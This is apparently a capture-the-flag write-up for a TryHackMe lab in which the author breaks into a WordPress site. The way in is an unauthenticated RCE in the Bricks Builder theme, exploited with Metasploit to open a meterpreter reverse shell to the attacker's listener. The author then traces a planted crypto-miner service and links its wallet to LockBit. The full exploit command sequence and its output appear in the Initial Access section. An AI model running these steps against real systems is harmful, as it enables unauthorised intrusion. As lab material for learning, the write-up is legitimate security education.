---
layout: single
machine_title: TryHack3M Bricks Heist
machine_url: https://tryhackme.com/room/tryhack3mbricksheist
parent: TryHackMe
os: Linux
difficulty: Easy
mitre: [Initial Access, Persistence]
tags: [WPScan, Metasploit]
starred: true
date: 2026-01-04
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.machine_title }}]({{ page.machine_url }})

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

{% include ctf-badges.html %}
---
## 1. Reconnaissance
### /etc/hosts
First we need to add the address as `<Machine-IP> bricks.thm` to our `/etc/hosts` in order to access the website.

### Nmap
Let's do a Nmap scan first to see what services are running:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
Nmap scan report for bricks.thm
Host is up (0.033s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
80/tcp   open  http     WebSockify Python/3.8.10
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
|_http-server-header: Apache
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-generator: WordPress 6.5
3306/tcp open  mysql    MySQL (unauthorized)
```
We can see `22:ssh`, `80:tcp` which has `WebSockify` running, `443:tcp` running `Apache` and `3306:MySQL` running the database.

### Directory Enumeration
Using `feroxbuster` we can search for domains available on the website:
```bash
❯ feroxbuster -u https://bricks.thm -k -w kali-wordlists/dirb/big.txt -t 10 -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://bricks.thm/
 🚩  In-Scope Url          │ bricks.thm
 🚀  Threads               │ 10
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      https://bricks.thm/wp-admin/ => https://bricks.thm/wp-login.php?redirect_to=https%3A%2F%2Fbricks.thm%2Fwp-admin%2F&reauth=1
400      https://bricks.thm/wp-admin/admin-ajax.php
301      https://bricks.thm/! => https://bricks.thm/
200      https://bricks.thm/wp-json
200      https://bricks.thm/wp-content/themes/bricks/assets/css/frontend.min.css
200      https://bricks.thm/wp-content/uploads/2024/04/bricks-1024x683.jpg
405      https://bricks.thm/xmlrpc.php
301      https://bricks.thm/0 => https://bricks.thm/0/
200      https://bricks.thm/wp-content/themes/bricks/assets/js/bricks.min.js
301      https://bricks.thm/0000 => https://bricks.thm/0000/
500      https://bricks.thm/wp-content/themes/bricks/
200      https://bricks.thm/
301      https://bricks.thm/B => https://bricks.thm/2024/04/02/brick-by-brick/
301      https://bricks.thm/S => https://bricks.thm/sample-page/
302      https://bricks.thm/admin => https://bricks.thm/wp-admin/
301      https://bricks.thm/asdfjkl; => https://bricks.thm/asdfjkl
301      https://bricks.thm/atom => https://bricks.thm/feed/atom/
301      https://bricks.thm/b => https://bricks.thm/2024/04/02/brick-by-brick/
301      https://bricks.thm/br => https://bricks.thm/2024/04/02/brick-by-brick/
404      https://bricks.thm/cgi-bin/
302      https://bricks.thm/dashboard => https://bricks.thm/wp-admin/
301      https://bricks.thm/embed => https://bricks.thm/embed/
302      https://bricks.thm/favicon.ico => https://bricks.thm/wp-includes/images/w-logo-blue-white-bg.png
301      https://bricks.thm/feed => https://bricks.thm/feed/
301      https://bricks.thm/fixed! => https://bricks.thm/fixed
302      https://bricks.thm/login => https://bricks.thm/wp-login.php
301      https://bricks.thm/page1 => https://bricks.thm/
301      https://bricks.thm/phpmyadmin => https://bricks.thm/phpmyadmin/
301      https://bricks.thm/rdf => https://bricks.thm/feed/rdf/
200      https://bricks.thm/robots.txt
301      https://bricks.thm/rss => https://bricks.thm/feed/
301      https://bricks.thm/rss2 => https://bricks.thm/feed/
301      https://bricks.thm/s => https://bricks.thm/sample-page/
301      https://bricks.thm/sa => https://bricks.thm/sample-page/
301      https://bricks.thm/sam => https://bricks.thm/sample-page/
301      https://bricks.thm/sample-page => https://bricks.thm/sample-page/
301      https://bricks.thm/sample => https://bricks.thm/sample-page/
301      https://bricks.thm/wp-admin => https://bricks.thm/wp-admin/
301      https://bricks.thm/wp-content => https://bricks.thm/wp-content/
301      https://bricks.thm/wp-includes => https://bricks.thm/wp-includes/
8m     20524/20524   0s      found:40      errors:1
8m     20469/20469   45/s    https://bricks.thm/
```
According to `feroxbuster` and after some looking into the pages i found that there are two useful URLs in the results:
```bash
https://bricks.thm/wp-login.php
https://bricks.thm/phpmyadmin/
```
They are both login pages and can become useful later on.

### WPScan Enumeration
Since the website is using `wordpress` we can also check and see if `WPScan` can find something interesting:
```bash
❯ wpscan --url https://bricks.thm --enumerate u,p,t --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | `_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [<Machine-IP>]
[+] Started: Sun Jan  4 13:31:42 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[i] Theme(s) Identified:

[+] bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[i] User(s) Identified:

[+] administrator
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - https://bricks.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
We finally have a username named `administrator` which is a solid find for now.

Let's take a detour and see if there is an exploit available for `Bricks` theme on `metasploit`.

## 2. Initial Access
### Metasploit
Let's use the `Inspect Element` on homepage of the website `https://bricks.thm` and see when the website was active.
I found:
```html
<script src="https://bricks.thm/wp-content/themes/bricks/assets/js/bricks.min.js?ver=1705030332" id="bricks-scripts-js"></script>
```
We have a `timestamp=1704844350 = January 10, 2024` why? because:
```bash
❯ date -d @1704844350
Wed Jan 10 12:52:30 AM CET 2024
```
Let's see what metasploit has for our `Bricks` theme based on the date we got.
```bash
msf > search bricks

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_bricks_builder_rce  2024-02-19       excellent  Yes    Unauthenticated RCE in Bricks Builder Theme
   1    \_ target: Automatic                    .                .          .      .
   2    \_ target: PHP In-Memory                .                .          .      .
   3    \_ target: Unix In-Memory               .                .          .      .
   4    \_ target: Windows In-Memory            .                .          .      .
```
We have found an exploit for this theme (`CVE-2024-25600` - Unauthenticated RCE in Bricks Builder Theme) and we can use it because it released on `2024-02-19` which means that the website is `OUTDATED!`.

So let's use this exploit and see if it works.
```bash
msf > use exploit/multi/http/wp_bricks_builder_rce
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(multi/http/wp_bricks_builder_rce) > set RHOSTS bricks.thm
RHOSTS => bricks.thm
msf exploit(multi/http/wp_bricks_builder_rce) > set RPORT 443
RPORT => 443
msf exploit(multi/http/wp_bricks_builder_rce) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf exploit(multi/http/wp_bricks_builder_rce) > set TARGETURI /?rest_route=/bricks/v1/render_element
TARGETURI => /?rest_route=/bricks/v1/render_element
msf exploit(multi/http/wp_bricks_builder_rce) > set LHOST tun0
LHOST => tun0
msf exploit(multi/http/wp_bricks_builder_rce) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/wp_bricks_builder_rce) > check
[*] WordPress Version: 6.5
[+] Detected Bricks Builder theme version: 1.9.5
[*] <Machine-IP>:443 - The target appears to be vulnerable.
msf exploit(multi/http/wp_bricks_builder_rce) > exploit
[*] Started reverse TCP handler on <Your-IP>:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.5
[+] Detected Bricks Builder theme version: 1.9.5
[+] The target appears to be vulnerable.
[+] Nonce retrieved: dce9f95a2a
[*] Sending stage (41224 bytes) to <Machine-IP>
[*] Meterpreter session 1 opened (<Your-IP>:4444 -> <Machine-IP>:47216) at 2026-01-04 14:04:48 +0100

meterpreter > getuid
Server username: apache
```
* Basically first we select the module: `use exploit/multi/http/wp_bricks_builder_rce`
* Then we set the target:
    * `set RHOSTS bricks.thm`
    * `set RPORT 443`
    * Because it is https: `set SSL true`
* Set the listener:
    * `set LHOST tun0`
    * `set LPORT 4444`
* Finally `check` and `exploit`

We see that we can not execute `shell` but we can see the basic commands run perfectly fine such as `cat`, `ls`, `pwd`.

Let's continue with this approach and see what can we collect.
### 3 The Flags
#### 3.1 First Flag
We have found that we have access with `meterpreter` and can run commands, so let's run some commands!
```bash
meterpreter > ls
Listing: /data/www/default
==========================

Mode          Size   Type  Last modified          Name
----          ----   ----  -------------          ----
100644/rw-r-  523    fil   2024-04-02 13:13:36 +  .htaccess
-r--                       0200
100644/rw-r-  43     fil   2024-04-05 14:39:01 +  650c844110baced87e160
-r--                       0200                   6453b93f22a.txt
100644/rw-r-  405    fil   2024-04-02 13:12:03 +  index.php
-r--                       0200
040755/rwxr-  4096   dir   2023-04-12 02:53:55 +  kod
xr-x                       0200
100644/rw-r-  19915  fil   2024-04-04 17:15:40 +  license.txt
-r--                       0200
040755/rwxr-  4096   dir   2024-04-02 13:03:35 +  phpmyadmin
xr-x                       0200
100644/rw-r-  7401   fil   2024-04-04 17:15:40 +  readme.html
-r--                       0200
100644/rw-r-  7387   fil   2024-04-04 17:15:40 +  wp-activate.php
-r--                       0200
040755/rwxr-  4096   dir   2024-04-02 13:12:03 +  wp-admin
xr-x                       0200
100644/rw-r-  351    fil   2024-04-02 13:12:03 +  wp-blog-header.php
-r--                       0200
100644/rw-r-  2323   fil   2024-04-02 13:12:03 +  wp-comments-post.php
-r--                       0200
100644/rw-r-  3012   fil   2024-04-04 17:15:40 +  wp-config-sample.php
-r--                       0200
100666/rw-rw  3288   fil   2024-04-02 13:12:39 +  wp-config.php
-rw-                       0200
040755/rwxr-  4096   dir   2026-01-04 13:09:21 +  wp-content
xr-x                       0100
100644/rw-r-  5638   fil   2024-04-02 13:12:03 +  wp-cron.php
-r--                       0200
040755/rwxr-  16384  dir   2024-04-04 17:15:40 +  wp-includes
xr-x                       0200
100644/rw-r-  2502   fil   2024-04-02 13:12:03 +  wp-links-opml.php
-r--                       0200
100644/rw-r-  3927   fil   2024-04-02 13:12:03 +  wp-load.php
-r--                       0200
100644/rw-r-  50917  fil   2024-04-04 17:15:40 +  wp-login.php
-r--                       0200
100644/rw-r-  8525   fil   2024-04-02 13:12:03 +  wp-mail.php
-r--                       0200
100644/rw-r-  28427  fil   2024-04-04 17:15:40 +  wp-settings.php
-r--                       0200
100644/rw-r-  34385  fil   2024-04-02 13:12:03 +  wp-signup.php
-r--                       0200
100644/rw-r-  4885   fil   2024-04-02 13:12:03 +  wp-trackback.php
-r--                       0200
100644/rw-r-  3246   fil   2024-04-04 17:15:40 +  xmlrpc.php
-r--                       0200
```
Since we are looking for `the content of the hidden .txt file in the web folder` let's see what is the content of that suspicious file:
```bash
meterpreter > cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c...f22a}
```
Ok, so that is the first flag we found.

#### 3.2 Second Flag 
Next we have to find `the name of the suspicious process`. Let's use `ps` command for this purpose:
```bash
meterpreter > ps -aux

Process List
============

 PID   Name                  User      Path
 ---   ----                  ----      ----
 3179  [kworker/u30:1-ext4-  root      [kworker/u30:1-ext4-rsv-conversi
       rsv-conversion]                 on]
 3182  /lib/NetworkManager/  root      /lib/NetworkManager/nm-inet-dial
       nm-inet-dialog                  og
 3183  /lib/NetworkManager/  root      /lib/NetworkManager/nm-inet-dial
       nm-inet-dialog                  og
 3190  sh                    apache    sh -c cd '/data/www/default' ; p
                                       s ax -w -o pid,user,cmd --no-hea
                                       der 2>/dev/null
 3191  ps                    apache    ps ax -w -o pid,user,cmd --no-he
                                       ader
```
So the suspicious process is indeed `nm-inet-dialog` because this is running as root which should not be.

### 3.3 Third Flag
Now that we found the suspicious process we need to find the service connected to this process, in order to find it, we have to look into systemd processes:
```bash
meterpreter > ls /etc/systemd/system/
Listing: /etc/systemd/system/
=============================

Mode          Size  Type  Last modified          Name
----          ----  ----  -------------          ----
100644/rw-r-  472   fil   2025-03-27 22:10:08 +  badr.service
-r--                      0100
040755/rwxr-  4096  dir   2022-02-27 15:38:48 +  bluetooth.target.wants
xr-x                      0100
040755/rwxr-  4096  dir   2025-11-01 16:50:25 +  cloud-config.target.wa
xr-x                      0100                   nts
040755/rwxr-  4096  dir   2020-10-27 00:30:20 +  cloud-final.service.wa
xr-x                      0100                   nts
040755/rwxr-  4096  dir   2025-11-01 16:50:26 +  cloud-init.target.want
xr-x                      0100                   s
100644/rw-r-  307   fil   2021-03-01 14:44:39 +  dbus-fi.w1.wpa_supplic
-r--                      0100                   ant1.service
100644/rw-r-  419   fil   2023-11-29 10:11:45 +  dbus-org.bluez.service
-r--                      0100
100644/rw-r-  1044  fil   2023-11-16 16:26:56 +  dbus-org.freedesktop.A
-r--                      0100                   vahi.service
100644/rw-r-  480   fil   2022-04-08 11:37:10 +  dbus-org.freedesktop.M
-r--                      0200                   odemManager1.service
100644/rw-r-  364   fil   2024-02-16 18:36:54 +  dbus-org.freedesktop.n
-r--                      0100                   m-dispatcher.service
100644/rw-r-  1731  fil   2023-11-21 22:10:21 +  dbus-org.freedesktop.r
-r--                      0100                   esolve1.service
100644/rw-r-  1484  fil   2023-11-21 22:10:21 +  dbus-org.freedesktop.t
-r--                      0100                   imesync1.service
040755/rwxr-  4096  dir   2020-10-27 00:25:45 +  default.target.wants
xr-x                      0100
100644/rw-r-  506   fil   2019-08-14 04:18:58 +  display-manager.servic
-r--                      0200                   e
040755/rwxr-  4096  dir   2022-02-27 15:40:19 +  display-manager.servic
xr-x                      0100                   e.wants
040755/rwxr-  4096  dir   2020-10-27 00:30:15 +  emergency.target.wants
xr-x                      0100
040755/rwxr-  4096  dir   2020-10-27 00:30:21 +  final.target.wants
xr-x                      0100
040755/rwxr-  4096  dir   2020-10-27 00:25:53 +  getty.target.wants
xr-x                      0100
040755/rwxr-  4096  dir   2022-02-27 15:42:42 +  graphical.target.wants
xr-x                      0100
100644/rw-r-  987   fil   2021-01-19 13:38:01 +  iscsi.service
-r--                      0100
040755/rwxr-  4096  dir   2020-10-27 00:29:33 +  mdmonitor.service.want
xr-x                      0100                   s
040755/rwxr-  4096  dir   2026-01-04 13:07:03 +  multi-user.target.want
xr-x                      0100                   s
100644/rw-r-  807   fil   2023-11-07 22:20:27 +  multipath-tools.servic
-r--                      0100                   e
040755/rwxr-  4096  dir   2022-02-27 15:44:26 +  network-online.target.
xr-x                      0100                   wants
040755/rwxr-  4096  dir   2022-02-27 15:40:19 +  oem-config.service.wan
xr-x                      0100                   ts
040755/rwxr-  4096  dir   2020-10-27 00:29:47 +  open-vm-tools.service.
xr-x                      0100                   requires
040755/rwxr-  4096  dir   2020-10-27 00:36:14 +  paths.target.wants
xr-x                      0100
040755/rwxr-  4096  dir   2022-02-27 15:45:30 +  printer.target.wants
xr-x                      0100
040755/rwxr-  4096  dir   2020-10-27 00:30:15 +  rescue.target.wants
xr-x                      0100
040755/rwxr-  4096  dir   2024-02-16 11:50:39 +  sleep.target.wants
xr-x                      0100
100644/rw-r-  382   fil   2025-11-01 16:43:29 +  snap-amazon\x2dssm\x2d
-r--                      0100                   agent-11797.mount
100644/rw-r-  379   fil   2024-04-04 11:48:08 +  snap-amazon\x2dssm\x2d
-r--                      0200                   agent-7983.mount
100644/rw-r-  346   fil   2024-04-02 11:51:07 +  snap-core-16928.mount
-r--                      0200
100644/rw-r-  346   fil   2025-11-01 16:42:22 +  snap-core-17247.mount
-r--                      0100
100644/rw-r-  349   fil   2024-02-16 11:46:44 +  snap-core18-2812.mount
-r--                      0100
100644/rw-r-  349   fil   2025-11-01 16:42:19 +  snap-core18-2952.mount
-r--                      0100
100644/rw-r-  349   fil   2024-04-02 11:50:58 +  snap-core20-2182.mount
-r--                      0200
100644/rw-r-  349   fil   2025-11-01 16:42:14 +  snap-core20-2669.mount
-r--                      0100
100644/rw-r-  349   fil   2025-11-01 16:43:09 +  snap-core22-2139.mount
-r--                      0100
100644/rw-r-  343   fil   2024-02-16 11:46:53 +  snap-lxd-24061.mount
-r--                      0100
100644/rw-r-  343   fil   2025-11-01 16:43:20 +  snap-lxd-32662.mount
-r--                      0100
100644/rw-r-  589   fil   2025-11-01 16:43:52 +  snap.amazon-ssm-agent.
-r--                      0100                   amazon-ssm-agent.servi
                                                 ce
100644/rw-r-  467   fil   2025-11-01 16:43:49 +  snap.lxd.activate.serv
-r--                      0100                   ice
100644/rw-r-  541   fil   2025-11-01 16:43:49 +  snap.lxd.daemon.servic
-r--                      0100                   e
100644/rw-r-  330   fil   2025-11-01 16:43:49 +  snap.lxd.daemon.unix.s
-r--                      0100                   ocket
040755/rwxr-  4096  dir   2025-11-01 16:44:27 +  snapd.mounts.target.wa
xr-x                      0100                   nts
040755/rwxr-  4096  dir   2025-11-01 16:43:57 +  sockets.target.wants
xr-x                      0100
100644/rw-r-  538   fil   2023-04-04 00:47:13 +  sshd.service
-r--                      0200
040755/rwxr-  4096  dir   2020-10-27 00:30:28 +  sysinit.target.wants
xr-x                      0100
100644/rw-r-  435   fil   2022-05-03 10:48:35 +  syslog.service
-r--                      0200
040755/rwxr-  4096  dir   2024-02-16 11:51:01 +  timers.target.wants
xr-x                      0100
100644/rw-r-  154   fil   2024-04-08 12:45:17 +  ubuntu.service
-r--                      0200
100644/rw-r-  489   fil   2022-09-08 06:08:51 +  vmtoolsd.service
-r--                      0200
```
This is a rather short list and by looking into the suspicious binary path we can find out that `ubuntu.service` is the the one we are looking for, that makes sense because OS vendors (like Canonical) rarely name a single service `ubuntu`!, they name it by functionality such as sshd, syslog, etc...
```bash
meterpreter > cat /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

### 3.4 Fourth Flag
For this flag we have to look deeper into the `NetworkManager` because the fake service was running under it, as we saw:
```bash
3220 /lib/NetworkManager/ root /lib/NetworkManager/nm-inet-dialog
```
So let's see what we have inside the main folder itself:
```bash
meterpreter > ls /lib/NetworkManager/
Listing: /lib/NetworkManager/
=============================

Mode          Size     Type  Last modified         Name
----          ----     ----  -------------         ----
040755/rwxr-  4096     dir   2022-02-27 15:36:14   VPN
xr-x                         +0100
040755/rwxr-  4096     dir   2024-04-03 08:39:58   conf.d
xr-x                         +0200
040755/rwxr-  4096     dir   2022-02-27 15:36:12   dispatcher.d
xr-x                         +0100
100644/rw-r-  66376    fil   2025-11-05 22:59:47   inet.conf
-r--                         +0100
100755/rwxr-  14712    fil   2024-02-16 18:36:54   nm-dhcp-helper
xr-x                         +0100
100755/rwxr-  47672    fil   2024-02-16 18:36:54   nm-dispatcher
xr-x                         +0100
100755/rwxr-  843048   fil   2024-02-16 18:36:54   nm-iface-helper
xr-x                         +0100
100755/rwxr-  6948448  fil   2024-04-08 12:28:26   nm-inet-dialog
xr-x                         +0200
100755/rwxr-  658736   fil   2024-02-16 18:36:54   nm-initrd-generator
xr-x                         +0100
100755/rwxr-  27024    fil   2020-03-11 02:37:20   nm-openvpn-auth-dial
xr-x                         +0100                 og
100755/rwxr-  59784    fil   2020-03-11 02:37:20   nm-openvpn-service
xr-x                         +0100
100755/rwxr-  31032    fil   2020-03-11 02:37:20   nm-openvpn-service-o
xr-x                         +0100                 penvpn-helper
100755/rwxr-  51416    fil   2018-11-27 14:46:53   nm-pptp-auth-dialog
xr-x                         +0100
100755/rwxr-  59544    fil   2018-11-27 14:46:53   nm-pptp-service
xr-x                         +0100
040755/rwxr-  4096     dir   2021-11-27 02:37:06   system-connections
xr-x                         +0100
```
We can see that the `inet.conf` sits here having the Miner info in it:
```bash
meterpreter > cat /lib/NetworkManager/inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
2024-04-08 10:46:18,755 [*] Miner()
......
......
```
The string is the `ID` we were looking for, but that looks rather too long. It is in fact `obfuscated` and needs some help solving.

Let's use [Cyberchef](https://cyberchef.io/) for this purpose.
The Recipe is:
* `From Hex`
* `Base64 Decode`
* `Base64 Decode`

and then we have the following string:
```bash
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```
Looking at the patern carefully, we figure out that this is indeed two wallet addresses concatenated together.

So the Wallet Address is:
`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

### 3.5 Last Flag
By searching this wallet address in any search engine we can see that [blockchain.com](https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa) has the indexes for this address.

For the last flag we need to find the threat group connected to this wallet, we need to do some `OSINT` to be able to find it.
On the link provided in relation with the wallet, we can see there are other wallets connected to the one we found, let's search and look for them one by one in a search engine until we have an answer.

The first transaction is from `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r`, after looking for clues on our top search we can find the [treasury](https://ofac.treasury.gov/recent-actions/20240220) linking to this incident.

On the webstie we can find that this is connected with the attack:
`United States Sanctions Affiliates of Russia-Based LockBit Ransomware Group`

So we can say that the answer to this part is: `LockBit`.

In conclusion, this CTF demonstrated how a critical RCE in a WordPress theme (Bricks Builder) can lead to full system compromise, allowing attackers to deploy crypto miners and persistence mechanisms like fake systemd services.

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
